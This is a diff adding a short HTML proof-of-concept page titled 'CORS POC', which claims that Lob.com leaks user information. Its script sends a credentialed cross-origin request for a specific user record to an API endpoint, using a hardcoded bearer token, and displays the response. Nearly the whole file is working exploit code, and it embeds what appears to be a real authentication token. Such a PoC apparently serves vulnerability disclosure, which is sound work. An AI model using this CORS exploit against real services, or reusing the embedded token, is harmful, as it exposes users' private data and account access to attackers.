@@ -1,0 +1,25 @@
+<html>
+<title>CORS POC</title>
+<center>
+<h1>Lob.com Leaking Users Informations With CORS</h1>
+</center>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('GET','https://api.example.com/v1/users/usr_1480858786c10db6',true);
+
+req.setRequestHeader
+(
+	"Authorization","Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InVzcl8xNDgwODU4Nzg2YzEwZGI2IiwibW9kZSI6InRlc3QiLCJ0b2tlbiI6IjQwNzgyODY4LTQ1MDEtNGYwMi1iYjc0LTI4MDIxNWIxMTk1NyIsImlhdCI6MTU0MTcwMzkxM30.x8fjHRZuXC7ks-ozfDaf2l23IjsbRSdw0iQZCpkLLmM"
+);
+ req.withCredentials = true;
+ req.send
+ (
+ 	'{}'
+ );
+ function reqListener() {
+
+ 	alert(this.responseText); 
+};
+</script>
+</html>
